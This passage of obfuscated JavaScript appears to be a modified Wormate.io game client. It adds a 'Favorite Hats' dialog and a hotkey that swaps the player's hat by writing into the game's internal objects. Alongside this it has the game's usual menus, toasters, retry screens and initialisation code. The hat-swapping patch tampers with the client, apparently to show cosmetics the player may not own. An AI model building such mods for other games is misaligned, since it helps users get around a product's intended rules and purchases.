        try {
          if (_0x438cdb.coords) {
            _0x4e718c.save();
            const _0x156cff = Math.min((_0x1981ce.width - 10) / _0x438cdb.coords.width, (_0x1981ce.height - 10) / _0x438cdb.coords.height) * 0.9;
            const _0x11d34b = _0x438cdb.coords.width * _0x156cff;
            const _0x3ba6a6 = _0x438cdb.coords.height * _0x156cff;
            const _0x4f5808 = (_0x1981ce.width - _0x11d34b) / 2;
            const _0x1e129f = (_0x1981ce.height - _0x3ba6a6) / 2;
            _0x4e718c.drawImage(_0x438cdb.image, _0x438cdb.coords.x, _0x438cdb.coords.y, _0x438cdb.coords.width, _0x438cdb.coords.height, _0x4f5808, _0x1e129f, _0x11d34b, _0x3ba6a6);
            _0x4e718c.restore();
          } else {
            const _0x42a150 = Math.min((_0x1981ce.width - 10) / _0x438cdb.image.width, (_0x1981ce.height - 10) / _0x438cdb.image.height) * 0.8;
            const _0x4b053c = _0x438cdb.image.width * _0x42a150;
            const _0x532558 = _0x438cdb.image.height * _0x42a150;
            const _0x4ed2f9 = (_0x1981ce.width - _0x4b053c) / 2;
            const _0xdac6f3 = (_0x1981ce.height - _0x532558) / 2;
            _0x4e718c.drawImage(_0x438cdb.image, _0x4ed2f9, _0xdac6f3, _0x4b053c, _0x532558);
          }
        } catch (_0x138ac8) {
          _0x4e718c.fillStyle = "#333";
          _0x4e718c.fillRect(0, 0, _0x1981ce.width, _0x1981ce.height);
          _0x4e718c.fillStyle = "white";
          _0x4e718c.font = "18px Arial";
          _0x4e718c.textAlign = "center";
          _0x4e718c.fillText("#" + _0x3eaecb, _0x1981ce.width / 2, _0x1981ce.height / 2);
        }
        return _0x226480;
      } catch (_0xbc7c7b) {
        const _0x27e265 = document.createElement("div");
        _0x27e265.style.cssText = "\n                width: 100%;\n                height: 100%;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                color: white;\n                background-color: #333;\n            ";
        _0x27e265.textContent = "#" + _0x3eaecb;
        return _0x27e265;
      }
    }
    _0x58e333.prototype.showFavoritesDialog = function () {
      $("#favorites-dialog, #favorites-overlay").remove();
      var _0x178f2f = $("<div>").attr("id", "favorites-overlay").css({
        position: "fixed",
        top: "0",
        left: "0",
        width: "100%",
        height: "100%",
        "background-color": "rgba(0, 0, 0, 0.5)",
        "z-index": "999"
      }).appendTo("body");
      var _0x43c81f = $("<div>").attr("id", "favorites-dialog").css({
        position: "fixed",
        top: "50%",
        left: "50%",
        transform: "translate(-50%, -50%)",
        "background-color": "#1e1e2f",
        "border-radius": "8px",
        "box-shadow": "0 4px 8px rgba(0, 0, 0, 0.5)",
        "z-index": "1000",
        width: "500px",
        overflow: "hidden",
        color: "white"
      }).appendTo("body");
      var _0x46dbf4 = $("<div>").css({
        padding: "15px 20px",
        "background-color": "#252538",
        "border-bottom": "1px solid #333345",
        position: "relative",
        display: "flex",
        "justify-content": "space-between",
        "align-items": "center"
      }).appendTo(_0x43c81f);
      $("<h3>").text("Favorite Hats").css({
        margin: "0 0 0 5px",
        "font-size": "18px",
        color: "white",
        "padding-left": "15px"
      }).appendTo(_0x46dbf4);
      var _0x1ec389 = $("<button>").html("&times;").css({
        position: "absolute",
        top: "8px",
        left: "10px",
        "font-size": "22px",
        background: "none",
        border: "none",
        color: "#aaa",
        cursor: "pointer",
        padding: "0 5px",
        "line-height": "1",
        "font-weight": "bold"
      }).appendTo(_0x46dbf4);
      var _0x1f38a7 = $("<button>").text("Clear All").css({
        padding: "4px 8px",
        "background-color": "#f44336",
        color: "white",
        border: "none",
        "border-radius": "4px",
        cursor: "pointer",
        "font-size": "12px"
      }).appendTo(_0x46dbf4);
      var _0x102419 = $("<div>").attr("id", "favorites-content").css({
        padding: "15px 20px",
        "max-height": "420px",
        "overflow-y": "auto"
      }).appendTo(_0x43c81f);
      var _0x4db330 = $("<div>").attr("class", "favorites-grid").css({
        display: "grid",
        "grid-template-columns": "1fr 1fr 1fr",
        gap: "12px",
        padding: "0",
        margin: "0"
      }).appendTo(_0x102419);
      var _0x599554 = this;
      _0x1f38a7.on("click", function () {
        if (confirm("Are you sure you want to remove all favorite hats?")) {
          _0x207b06.selectedHats = [];
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          _0x4db330.empty();
          $("<div>").css({
            "text-align": "center",
            padding: "10px",
            color: "#aaa",
            margin: "20px 0",
            "grid-column": "1 / span 3"
          }).text("You don't have any favorite hats yet.").appendTo(_0x4db330);
          if (_0x599554.hatToggleButton && _0x599554.hatToggleButton.is(":visible")) {
            _0x599554.hatToggleButton.text("★ Add").css("background-color", "#4CAF50");
          }
        }
      });
      function _0x265864() {
        _0x43c81f.remove();
        _0x178f2f.remove();
      }
      _0x1ec389.on("click", _0x265864);
      _0x178f2f.on("click", _0x265864);
      if (!_0x207b06.selectedHats || _0x207b06.selectedHats.length === 0) {
        $("<div>").css({
          "text-align": "center",
          padding: "10px",
          color: "#aaa",
          margin: "20px 0",
          "grid-column": "1 / span 2"
        }).text("You don't have any favorite hats yet.").appendTo(_0x4db330);
      } else {
        _0x207b06.selectedHats.forEach(function (_0xb1aef8) {
          _0x3226dc(_0xb1aef8);
        });
        _0x207b06.selectedHats.forEach(function (_0x18c6bc, _0x3e9e27) {
          var _0x38d17 = $("<div>").attr("data-index", _0x3e9e27).attr("data-hat-id", _0x18c6bc).css({
            display: "flex",
            "flex-direction": "column",
            "align-items": "center",
            padding: "2px",
            background: "#252538",
            "border-radius": "6px",
            position: "relative",
            height: "87px",
            width: "100%"
          }).appendTo(_0x4db330);
          var _0x2bf38e = $("<div>").css({
            width: "100%",
            height: "82px",
            background: "transparent",
            "border-radius": "4px",
            overflow: "visible",
            position: "relative",
            display: "flex",
            "justify-content": "center",
            "align-items": "center"
          }).appendTo(_0x38d17);
          var _0x1bea95 = $("<button>").text("X").css({
            position: "absolute",
            top: "4px",
            right: "4px",
            background: "#f44336",
            color: "white",
            border: "none",
            padding: "2px 6px",
            "border-radius": "3px",
            cursor: "pointer",
            "font-size": "12px",
            "z-index": "20"
          }).appendTo(_0x38d17);
          var _0x126ea2 = _0x3d52b8(_0x18c6bc);
          _0x2bf38e.append(_0x126ea2);
          _0x1bea95.on("click", function (_0x10d041) {
            _0x10d041.stopPropagation();
            var _0x3a77b5 = $(this).closest("[data-index]");
            var _0xa2108d = parseInt(_0x3a77b5.attr("data-index"));
            var _0x46bf63 = _0x3a77b5.attr("data-hat-id");
            if (_0x207b06.selectedHats && _0xa2108d >= 0 && _0xa2108d < _0x207b06.selectedHats.length) {
              _0x207b06.selectedHats.splice(_0xa2108d, 1);
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
              _0x3a77b5.fadeOut(300, function () {
                $(this).remove();
                _0x4db330.find("[data-index]").each(function (_0x50e230) {
                  $(this).attr("data-index", _0x50e230);
                });
                if (_0x207b06.selectedHats.length === 0) {
                  _0x4db330.empty();
                  $("<div>").css({
                    "text-align": "center",
                    padding: "10px",
                    color: "#aaa",
                    margin: "20px 0",
                    "grid-column": "1 / span 3"
                  }).text("You don't have any favorite hats yet.").appendTo(_0x4db330);
                }
                if (_0x599554.currentHatId === _0x46bf63 && _0x599554.hatToggleButton) {
                  _0x599554.hatToggleButton.text("★ Add").css("background-color", "#4CAF50");
                }
              });
            }
          });
        });
      }
      $(".favorites-content").on("scroll", function () {
        $(this).css("pointer-events", "auto");
      });
      $(".favorites-popup").on("shown", function () {
        setTimeout(function () {
          $(".favorites-content").scrollTop(0);
        }, 100);
      });
    };
    function _0x3896bc(_0x236e6d) {
      try {
        if (ooo && ooo.Mh && ooo.Mh.Lh && ooo.Mh.Lh.ki) {
          const _0x3fb0f9 = ooo.Mh.Lh.ki.Yi;
          ooo.Mh.Lh.ki.Yi = _0x236e6d;
          if (ooo.Mh.Qh && ooo.Mh.Qh.fh && ooo.Mh.li && ooo.Mh.li[ooo.Mh.Qh.fh] && ooo.Mh.li[ooo.Mh.Qh.fh].ki) {
            ooo.Mh.li[ooo.Mh.Qh.fh].ki.Yi = _0x236e6d;
          }
          if (_0x5c2dcc && _0x5c2dcc.uj && _0x5c2dcc.n) {
            const _0x5147dd = _0x5806af(_0x5c2dcc.uj);
            if (_0x5147dd) {
              _0x5d4f56(_0x5147dd, _0x236e6d);
              return true;
            } else {
              const _0x2b3893 = ooo.ud.Cc().Yb(_0x236e6d);
              if (_0x2b3893) {
                _0x7aa357(_0x5c2dcc.uj, _0x2b3893);
                return true;
              }
            }
          }
          return true;
        }
      } catch (_0x33e153) {}
      return false;
    }
    function _0x5806af(_0x1d14c0) {
      if (_0x1d14c0.Zc && _0x1d14c0.Zc.rd) {
        return _0x1d14c0.Zc.rd;
      }
      return null;
    }
    function _0x5d4f56(_0x42858d, _0x2e01ab) {
      if (_0x42858d && _0x42858d.length > 0) {
        const _0x204fb1 = ooo.ud.Cc().Yb(_0x2e01ab);
        if (_0x204fb1 && _0x204fb1.dc && _0x204fb1.dc.length > 0) {
          try {
            _0x42858d[0].kd(_0x204fb1.dc[0]);
            return true;
          } catch (_0x24f798) {}
        }
      }
      return false;
    }
    function _0x7aa357(_0x550304, _0x397037) {
      if (_0x550304 && _0x550304.Zc && _0x397037) {
        try {
          _0x550304.Zc.yd(0.004, _0x550304.Zc.rd, _0x397037);
          return true;
        } catch (_0x4bea52) {}
      }
      return false;
    }
    function _0x5caafc() {
      if (!_0x207b06.selectedHats) {
        _0x207b06.selectedHats = [];
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        return;
      }
      if (_0x207b06.selectedHats.length > 0) {
        if (_0x207b06.currentHatIndex === undefined) {
          _0x207b06.currentHatIndex = 0;
        } else {
          _0x207b06.currentHatIndex = (_0x207b06.currentHatIndex + 1) % _0x207b06.selectedHats.length;
        }
        let _0x37bf23 = _0x207b06.selectedHats[_0x207b06.currentHatIndex];
        const _0x572f59 = _0x3896bc(_0x37bf23);
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      }
    }
    function _0x34eef2() {
      if (window.hatCyclingInitialized) {
        return;
      }
      $(document).on("keydown", function (_0x44f45d) {
        if (_0x44f45d.keyCode === 50 || _0x44f45d.which === 50) {
          _0x5caafc();
        }
      });
      window.hatCyclingInitialized = true;
    }
    function _0x1a20bf() {
      if (!_0x207b06.selectedHats || _0x207b06.selectedHats.length === 0) {
        return;
      }
      _0x207b06.selectedHats.forEach(function (_0x377570) {
        _0x3226dc(_0x377570);
      });
    }
    $(document).ready(function () {
      setTimeout(function () {
        _0x34eef2();
        _0x1a20bf();
        window.openHatFavorites = function () {
          if (_0x58e333.prototype.showFavoritesDialog) {
            var _0x55d65e = new _0x58e333();
            _0x55d65e.showFavoritesDialog();
          }
        };
        window.hatHelp = function () {};
      }, 1000);
    });
    function _0xf4dc45() {
      try {
        const _0x29bfbe = [];
        const _0x31dbec = ooo.ud.Cc();
        if (!_0x31dbec) {
          return _0x29bfbe;
        }
        for (let _0x1deb2b in _0x31dbec.Vb) {
          if (_0x31dbec.Vb.hasOwnProperty(_0x1deb2b)) {
            _0x29bfbe.push(_0x1deb2b);
          }
        }
        return _0x29bfbe;
      } catch (_0x4601c6) {
        return [];
      }
    }
    function _0x531053() {}
    window.addEventListener("load", function () {
      setTimeout(function () {
        _0x1a20bf();
        _0x531053();
      }, 2000);
    });
    _0x3bd2c9 = function () {
      function _0x438a3c(_0xb26351, _0x1b7e2d, _0x50cbf6) {
        this.Cp = _0xb26351;
        this.Wd = _0x1b7e2d;
        this.ep = _0x50cbf6;
        this.Lc = {};
        this.Sp = [[]];
        this.Tp = -10;
        this.Up = -10;
      }
      _0x438a3c.prototype.Op = function (_0x309eeb) {
        this.Sp = _0x309eeb;
      };
      _0x438a3c.prototype.Pp = function (_0x2353f) {
        this.Lc = _0x2353f;
      };
      _0x438a3c.prototype.ml = function () {
        var _0x530e14 = ooo.so.Zj(this.Wd);
        for (var _0x47b547 = 0; _0x47b547 < this.Sp.length; _0x47b547++) {
          for (var _0x43710b = 0; _0x43710b < this.Sp[_0x47b547].length; _0x43710b++) {
            if (this.Sp[_0x47b547][_0x43710b] === _0x530e14) {
              this.Vp(_0x47b547);
              this.Wp(_0x43710b);
              return;
            }
          }
        }
        ;
        this.Vp(0);
        this.Wp(0);
      };
      _0x438a3c.prototype.Lp = function () {
        var _0x284553 = this.Tp - 1;
        if (_0x284553 < 0) {
          _0x284553 = this.Sp.length - 1;
        }
        this.Vp(_0x284553);
        this.Wp(this.Up % this.Sp[_0x284553].length);
      };
      _0x438a3c.prototype.Mp = function () {
        var _0xba704c = this.Tp + 1;
        if (_0xba704c >= this.Sp.length) {
          _0xba704c = 0;
        }
        this.Vp(_0xba704c);
        this.Wp(this.Up % this.Sp[_0xba704c].length);
      };
      _0x438a3c.prototype.Vp = function (_0x19ceea) {
        var _0x58a5a8 = this;
        if (!(_0x19ceea < 0) && !(_0x19ceea >= this.Sp.length)) {
          this.Tp = _0x19ceea;
          _0x4e7822.empty();
          var _0x1306a4 = this.Sp[this.Tp];
          if (_0x1306a4.length > 1) {
            for (var _0x3028e8 = 0; _0x3028e8 < _0x1306a4.length; _0x3028e8++) {
              (function (_0x11c129) {
                var _0x225cc4 = _0x1306a4[_0x11c129];
                var _0x331d0c = _0x58a5a8.Lc[_0x225cc4];
                var _0x38ad64 = "#" + _0x58a5a8.Cp.Jp[_0x331d0c.prime];
                var _0x287bae = $("<div style=\"border-color: " + _0x38ad64 + "\"></div>");
                _0x287bae.click(function () {
                  ooo.ij.if();
                  _0x58a5a8.Wp(_0x11c129);
                });
                _0x4e7822.append(_0x287bae);
              })(_0x3028e8);
            }
          }
        }
      };
      _0x438a3c.prototype.Wp = function (_0x1ed162) {
        if (!(_0x1ed162 < 0) && !(_0x1ed162 >= this.Sp[this.Tp].length)) {
          this.Up = _0x1ed162;
          _0x4e7822.children().css("background-color", "transparent");
          var _0x1209c4 = _0x4e7822.children(":nth-child(" + (1 + _0x1ed162) + ")");
          _0x1209c4.css("background-color", _0x1209c4.css("border-color"));
          this.Cp.tp(true);
        }
      };
      _0x438a3c.prototype.Ap = function () {
        return this.Sp[this.Tp][this.Up];
      };
      return _0x438a3c;
    }();
    _0x7f096e.Vk = _0x58e333;
    _0x17aa2f = $(".play-button");
    _0xf069d1 = $(".close-button");
    (_0x2b8ce5 = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.consent.tab"), false);
      _0x17aa2f.click(function () {
        ooo.ij.if();
        if (ooo.kp()) {
          ooo.Xg.gl(ooo.Xg.Jf);
          ooo.Xp(false, true);
          ooo.Xg.Yk.Fo(new _0x7f096e.Yp());
        } else {
          ooo.Xg.jl();
        }
      });
      _0xf069d1.click(function () {
        ooo.ij.if();
        ooo.Xg.jl();
      });
    })).prototype.Sa = function () {
      _0x2b8ce5.parent.prototype.Sa.call(this);
    };
    _0x2b8ce5.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.Uo, 200);
      _0x4ead11.f.h(_0x7f096e.Ho.Vo, 50);
    };
    _0x2b8ce5.prototype.nl = function () {
      ooo.ij.jf();
    };
    _0x7f096e.Ek = _0x2b8ce5;
    _0x44378b = $("#delete-account-timer");
    _0x569188 = $("#delete-account-yes");
    _0x8601ac = $("#delete-account-no");
    (_0x21615f = _0x331039.ca(_0x7f096e.Ho, function () {
      _0x7f096e.Ho.call(this, _0x331039.U("index.game.popup.menu.delete.tab"), false);
      _0x569188.click(function () {
        ooo.ij.if();
        if (ooo.ok.nk()) {
          ooo.ok.ym();
          ooo.ok.qm();
        } else {
          ooo.Xg.jl();
        }
      });
      _0x8601ac.click(function () {
        ooo.ij.if();
        ooo.Xg.jl();
      });
      this.Zp = [];
    })).prototype.Sa = function () {
      _0x21615f.parent.prototype.Sa.call(this);
    };
    _0x21615f.prototype.Wo = function () {
      _0x4ead11.f.h(_0x7f096e.Ho.Mo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.No, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Oo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Po, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Qo, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Ro, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.So, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.To, 50);
      _0x4ead11.f.h(_0x7f096e.Ho.Uo, 50);
      _0x4ead11.f.g(_0x7f096e.Ho.Vo, 200);
    };
    _0x21615f.prototype.nl = function () {
      ooo.ij.nf();
      _0x4ead11.f.h(_0x569188, 1);
      _0x4ead11.f.g(_0x44378b, 1);
      _0x44378b.text("..10 ..");
      this.$p();
      this._p(function () {
        _0x44378b.text("..9 ..");
      }, 1000);
      this._p(function () {
        _0x44378b.text("..8 ..");
      }, 2000);
      this._p(function () {
        _0x44378b.text("..7 ..");
      }, 3000);
      this._p(function () {
        _0x44378b.text("..6 ..");
      }, 4000);
      this._p(function () {
        _0x44378b.text("..5 ..");
      }, 5000);
      this._p(function () {
        _0x44378b.text("..4 ..");
      }, 6000);
      this._p(function () {
        _0x44378b.text("..3 ..");
      }, 7000);
      this._p(function () {
        _0x44378b.text("..2 ..");
      }, 8000);
      this._p(function () {
        _0x44378b.text("..1 ..");
      }, 9000);
      this._p(function () {
        _0x4ead11.f.g(_0x569188, 300);
        _0x4ead11.f.h(_0x44378b, 1);
      }, 10000);
    };
    _0x21615f.prototype._p = function (_0x5f898a, _0x362ead) {
      var _0x4b2bfa = _0x331039.Y(_0x5f898a, _0x362ead);
      this.Zp.push(_0x4b2bfa);
    };
    _0x21615f.prototype.$p = function () {
      for (var _0x527d21 = 0; _0x527d21 < this.Zp.length; _0x527d21++) {
        _0x331039.Z(this.Zp[_0x527d21]);
      }
      ;
      this.Zp = [];
    };
    _0x7f096e.Gk = _0x21615f;
    _0x7f096e.aq = function () {
      function _0x5b851f() {
        this.Go = function () {};
      }
      _0x5b851f.prototype.ag = function () {};
      _0x5b851f.prototype.nl = function () {};
      return _0x5b851f;
    }();
    (_0x275237 = _0x331039.ca(_0x7f096e.aq, function (_0x24b293) {
      _0x7f096e.aq.call(this);
      var _0x39c5da = _0x331039.Ca() + "_" + _0x331039._(1000 + _0x331039.ma() * 8999);
      this.bq = $("<div id=\"" + _0x39c5da + "\" class=\"toaster toaster-coins\"><img class=\"toaster-coins-img\" alt=\"Wormate Coin\" src=\"/images/coin_320.png\" /><div class=\"toaster-coins-val\">" + _0x24b293 + "</div><div class=\"toaster-coins-close\">" + _0x331039.U("index.game.toaster.continue") + "</div></div>");
      var _0x478b79 = this;
      this.bq.find(".toaster-coins-close").click(function () {
        ooo.ij.if();
        _0x478b79.Go();
      });
    })).prototype.ag = function () {
      return this.bq;
    };
    _0x275237.prototype.nl = function () {
      ooo.ij.lf();
    };
    _0x7f096e.mm = _0x275237;
    (_0x46f318 = _0x331039.ca(_0x7f096e.aq, function (_0x5aaf3b) {
      _0x7f096e.aq.call(this);
      var _0xf38c05 = _0x331039.Ca() + "_" + _0x331039._(1000 + _0x331039.ma() * 8999);
      this.bq = $("<div id=\"" + _0xf38c05 + "\" class=\"toaster toaster-levelup\"><img class=\"toaster-levelup-img\" alt=\"Wormate Level Up Star\" src=\"/images/level-star.svg\" /><div class=\"toaster-levelup-val\">" + _0x5aaf3b + "</div><div class=\"toaster-levelup-text\">" + _0x331039.U("index.game.toaster.levelup") + "</div><div class=\"toaster-levelup-close\">" + _0x331039.U("index.game.toaster.continue") + "</div></div>");
      var _0x51c901 = this;
      this.bq.find(".toaster-levelup-close").click(function () {
        ooo.ij.if();
        _0x51c901.Go();
      });
    })).prototype.ag = function () {
      return this.bq;
    };
    _0x46f318.prototype.nl = function () {
      ooo.ij.kf();
    };
    _0x7f096e.lm = _0x46f318;
    (_0x2bf15d = _0x331039.ca(_0x7f096e.aq, function () {
      _0x7f096e.aq.call(this);
      var _0x5482e7 = this;
      var _0xbe9c97 = _0x331039.Ca() + "_" + _0x331039._(1000 + _0x331039.ma() * 8999);
      this.bq = $("<div id=\"" + _0xbe9c97 + "\" class=\"toaster toaster-consent-accepted\"><img class=\"toaster-consent-accepted-logo\" src=\"" + _0x494ea6.H.L + "\" alt=\"Wormate.io logo\"/><div class=\"toaster-consent-accepted-container\"><span class=\"toaster-consent-accepted-text\">" + _0x331039.U("index.game.toaster.consent.text").replaceAll(" ", "&nbsp;").replaceAll("\n", "<br/>") + "</span><a class=\"toaster-consent-accepted-link\" href=\"/privacy-policy\">" + _0x331039.U("index.game.toaster.consent.link") + "</a></div><div class=\"toaster-consent-close\">" + _0x331039.U("index.game.toaster.consent.iAccept") + "</div></div>");
      this.cq = this.bq.find(".toaster-consent-close");
      this.cq.hide();
      this.cq.click(function () {
        ooo.ij.if();
        if (ooo.kp()) {
          ooo.Xp(true, true);
        }
        _0x5482e7.Go();
      });
    })).prototype.ag = function () {
      return this.bq;
    };
    _0x2bf15d.prototype.nl = function () {
      var _0x54ce4a = this;
      if (ooo.kp() && !ooo.Pl()) {
        ooo.ij.nf();
        _0x331039.Y(function () {
          _0x54ce4a.cq.fadeIn(300);
        }, 2000);
      } else {
        _0x331039.Y(function () {
          _0x54ce4a.Go();
        }, 0);
      }
    };
    _0x7f096e.Yp = _0x2bf15d;
    _0x386cb4 = $("#error-gateway-connection-retry");
    (_0x2061ac = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
      _0x386cb4.click(function () {
        ooo.ij.if();
        ooo.Xg.Re.qo();
        ooo.Xg.gl(ooo.Xg.Re);
        _0x331039.Y(function () {
          var _0x19719d = _0x494ea6.H.J + "/pub/healthCheck/ping";
          _0x331039.Aa(_0x19719d, function () {
            ooo.Xg.gl(ooo.Xg._k);
          }, function (_0x10b3ae) {
            ooo.Xg.Re.oo();
            ooo.ud.rc(function () {
              ooo.Xg.gl(ooo.Xg.Jf);
            }, function (_0x286502) {
              ooo.Xg.gl(ooo.Xg._k);
            }, function (_0x1a7875, _0x238768) {
              ooo.Xg.Re.po(_0x1a7875, _0x238768);
            });
          });
        }, 2000);
      });
    })).prototype.Sa = function () {};
    _0x2061ac.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Sn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.$n, 500);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x2061ac.prototype.nl = function () {
      ooo.ij.Ye(_0x7f096e.Pe.Se.Jf);
      ooo.ij.nf();
    };
    _0x7f096e.al = _0x2061ac;
    _0x510a47 = $("#error-game-connection-retry");
    (_0x37fb80 = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
      _0x510a47.click(function () {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Jf);
      });
    })).prototype.Sa = function () {};
    _0x37fb80.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Sn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.g(_0x7f096e.Uf._n, 500);
    };
    _0x37fb80.prototype.nl = function () {
      ooo.ij.Ye(_0x7f096e.Pe.Se.Jf);
      ooo.ij.nf();
    };
    _0x7f096e.cl = _0x37fb80;
    _0x331039.dq = function () {
      function _0x58cc94(_0x30d748) {
        var _0x319b41 = _0x30d748 + _0x331039._(_0x331039.ma() * 65535) * 37;
        _0x7f096e.Cg.Ng(_0x7f096e.Cg.Lg, _0x319b41, 30);
      }
      return function () {
        var _0x2b2083 = parseInt(_0x7f096e.Cg.Og(_0x7f096e.Cg.Lg)) % 37;
        if (!(_0x2b2083 >= 0) || !(_0x2b2083 < _0x494ea6.co.fq)) {
          _0x2b2083 = _0x331039.ia(0, _0x494ea6.co.fq - 2);
        }
        var _0x54b45a = {
          gq: false
        };
        _0x54b45a.hq = _0x331039.Ca();
        _0x54b45a.iq = 0;
        _0x54b45a.jq = 0;
        _0x54b45a.kq = null;
        _0x54b45a.lq = _0x494ea6.H.Q;
        _0x54b45a.mq = _0x494ea6.H.P;
        _0x54b45a.Mh = null;
        _0x54b45a.ud = null;
        _0x54b45a.ef = null;
        _0x54b45a.ij = null;
        _0x54b45a.Xg = null;
        _0x54b45a.so = null;
        _0x54b45a.ok = null;
        try {
          var _0x24e7d0 = navigator;
          if (_0x24e7d0) {
            var _0x469e5b = _0x24e7d0.geolocation;
            if (_0x469e5b) {
              _0x469e5b.getCurrentPosition(function (_0x324491) {
                var _0x30934b = _0x324491.coords;
                if (_typeof(_0x30934b) != "undefined" && _typeof(_0x30934b.latitude) != "undefined" && _typeof(_0x30934b.longitude) != "undefined") {
                  _0x54b45a.kq = _0x324491;
                }
              }, function (_0x3b49e3) {});
            }
          }
        } catch (_0x5b87c2) {}
        ;
        _0x54b45a.Sa = function () {
          _0x54b45a.Mh = new _0x7f096e.nq();
          _0x54b45a.Mh.oq = new _0x7f096e.si(_0x54b45a.Mh);
          _0x54b45a.ud = new _0x7f096e.Kb();
          _0x54b45a.ef = new _0x7f096e.wk();
          _0x54b45a.ij = new _0x7f096e.Pe();
          _0x54b45a.Xg = new _0x7f096e.zk();
          _0x54b45a.so = new _0x7f096e.Sj();
          _0x54b45a.ok = new _0x7f096e.sl();
          try {
            ga("send", "event", "app", _0x494ea6.H.I + "_init");
          } catch (_0x12e2df) {}
          ;
          _0x54b45a.Mh.pq = function () {
            _0x54b45a.Xg.gl(_0x54b45a.Xg.bl);
          };
          _0x54b45a.Mh.qq = function () {
            var _0x453bc9 = _0x54b45a.Xg.Jf.Ao();
            try {
              ga("send", "event", "game", _0x494ea6.H.I + "_start", _0x453bc9);
            } catch (_0x3798fb) {}
            ;
            _0x54b45a.ij.Ye(_0x7f096e.Pe.Se.Kf);
            _0x54b45a.Xg.gl(_0x54b45a.Xg.Kf.ho());
          };
          _0x54b45a.Mh.rq = function () {
            var _0x18345d;
            var _0x1ace7f;
            try {
              ga("send", "event", "game", _0x494ea6.H.I + "_end");
            } catch (_0xd2580b) {}
            ;
            if ($("body").height() >= 430) {
              _0x494ea6.co.sq.Va();
            }
            _0x54b45a.ud.rc(null, null, null);
            _0x18345d = _0x331039._(_0x54b45a.Mh.Lh.hi);
            _0x1ace7f = _0x54b45a.Mh.oi;
            if (_0x54b45a.ok.nk()) {
              _0x54b45a.ok.hm(function () {
                _0x54b45a.tq(_0x18345d, _0x1ace7f);
              });
            } else {
              _0x54b45a.tq(_0x18345d, _0x1ace7f);
            }
          };
          _0x54b45a.Mh.uq = function (_0x77ca03) {
            _0x77ca03(_0x54b45a.Xg.Kf.ko(), _0x54b45a.Xg.Kf.lo());
          };
          _0x54b45a.ok.em(function () {
            var _0x11f29c = _0x54b45a.Xg.rl();
            if (_0x11f29c != null && _0x11f29c.Wd === _0x7f096e.ll.kl) {
              _0x54b45a.ij.Ye(_0x7f096e.Pe.Se.Jf);
              _0x54b45a.Xg.gl(_0x54b45a.Xg.Jf);
            }
            if (_0x54b45a.ok.nk()) {
              var _0x1bdb64 = _0x54b45a.ok.Kl();
              try {
                ga("set", "userId", _0x1bdb64);
              } catch (_0x281686) {}
            }
            if (_0x54b45a.kp() && _0x54b45a.ok.nk() && !_0x54b45a.ok.Pl()) {
              _0x54b45a.Xp(false, false);
              _0x54b45a.Xg.Yk.Fo(new _0x7f096e.Yp());
            } else {
              _0x54b45a.vq(true);
            }
          });
          _0x54b45a.Mh.Sa();
          _0x54b45a.Xg.Sa();
          _0x54b45a.so.Sa();
          _0x54b45a.ud.Sa();
          _0x54b45a.Xg.Jf.zo();
          _0x54b45a.Xg.gl(_0x54b45a.Xg.Jf);
          _0x54b45a.ef.Sa(function () {
            _0x54b45a.ij.Sa();
            _0x54b45a.ok.Sa();
            _0x54b45a.ud.rc(function () {
